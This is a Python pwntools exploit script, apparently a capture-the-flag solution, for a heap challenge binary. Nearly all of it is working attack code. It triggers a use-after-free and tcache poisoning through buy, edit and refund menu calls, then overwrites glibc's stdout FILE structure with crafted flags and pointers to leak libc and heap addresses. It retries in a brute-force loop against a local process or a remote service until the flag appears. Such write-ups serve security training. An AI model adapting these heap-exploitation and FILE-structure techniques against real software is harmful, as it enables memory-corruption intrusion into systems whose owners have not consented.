#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())


# above: 0x555555558010
# pet : 0x555555558060
# name size: 0x555555558160
# stdout: 0xb780

def buy(num):
    sna(b'> ', 1)
    sna(b'much? ', num)

def edit(idx, data):
    sna(b'> ', 2)
    sna(b'Index: ', idx)
    sa(b'Name: ', data)

def refund(idx):
    sna(b'> ', 3)
    sna(b'Index: ', idx)


###########
# exploit #
###########

def script():
    
    buy(100)
    buy(2000)
    buy(100)
    buy(100)
    buy(100)

    # uaf tcache
    # refund - prepare for tcache poison 3 times
    refund(3)
    refund(0)
    refund(2)

    buy(100)

    refund(2)

    # get libc in heap
    refund(1)
    buy(2000)

    edit(0, p16(0xb3b0))
    edit(1, p16(0x96c8))

    buy(100)
    buy(100)

    # overwrite stdout and leak libc
    buy(100)

    edit(5, p8(0xff))

    libc_leak = u64(p.recv(35)[-6:] + b'\0\0')
    libc.address = libc_leak - 0x1ec880
    stdout = libc.sym._IO_2_1_stdout_
    main_arena = stdout - 0xac0

    info("libc leak: " + hex(libc_leak))
    info("libc base: " + hex(libc.address))

    # main arena = stdout - 0xac0

    buy(100)

    refund(4)
    refund(6)
    refund(2)

    edit(0, p16(0xb3b0))
    edit(1, p16(0x96a0))

    buy(100)
    buy(100)
    buy(100)

    # 5 is write ptr
    # 6 is stdout 

    load = flat(
        0xfbad2887,
        0, 
        main_arena, # read end
        0,
        main_arena, # write base
    )

    edit(6, load)

    heap_leak = u64(p.recv(6) + b'\0\0')
    info("heap leak: " + hex(heap_leak))

    load = flat(
        0xfbad2887,
        0, 
        heap_leak -0xa38 , # read end
        0,
        heap_leak -0xa38, # write base
        heap_leak - 0xa20, # write ptr
        heap_leak - 0xa20 # write end
    )

    edit(6, load)


count = 0

# while (count < 1):
while(1):
    count+=1
    info(f'attemp {count}: ')

    if args.REMOTE:
        p = remote('0', 1337)
    else:
        p = process([exe.path])

    def GDB():
        if not args.REMOTE:
            gdb.attach(p, gdbscript='''
            # b*0x55555555538c
                
            c
            ''')
            sleep(1)
    # GDB()


    try: 
        script()
        output = p.recvline()
        if b'flag' in output:
            print(output)
            p.interactive()
            break  
        else:
            p.close()
            continue
    except EOFError:
        p.close()
        continue

p.interactive()